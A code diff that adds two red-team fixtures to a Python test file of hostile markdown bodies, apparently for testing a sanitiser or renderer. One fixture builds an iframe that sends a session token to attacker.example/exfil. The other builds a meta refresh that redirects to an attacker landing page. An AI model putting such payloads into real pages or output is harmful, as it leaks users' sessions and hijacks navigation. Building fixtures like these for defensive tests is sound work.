@@ -23,9 +23,21 @@ def _make_evil_body_rt_md_004() -> str:
     return f"A trustworthy link [paper][{label}].\n\n[{label}]: https://{host}/owned\n"
 
 
+def _make_evil_body_rt_md_005() -> str:
+    host, path = "attacker.example", "/exfil"
+    return f'<iframe src="http://{host}{path}?token=session"></iframe>\n'
+
+
+def _make_evil_body_rt_md_006() -> str:
+    host = "attacker.example"
+    return f'<meta http-equiv="refresh" content="0;url=http://{host}/landing">\n'
+
+
 FIXTURES = {
     "RT-MD-001": _make_evil_body_rt_md_001,
     "RT-MD-002": _make_evil_body_rt_md_002,
     "RT-MD-003": _make_evil_body_rt_md_003,
     "RT-MD-004": _make_evil_body_rt_md_004,
+    "RT-MD-005": _make_evil_body_rt_md_005,
+    "RT-MD-006": _make_evil_body_rt_md_006,
 }
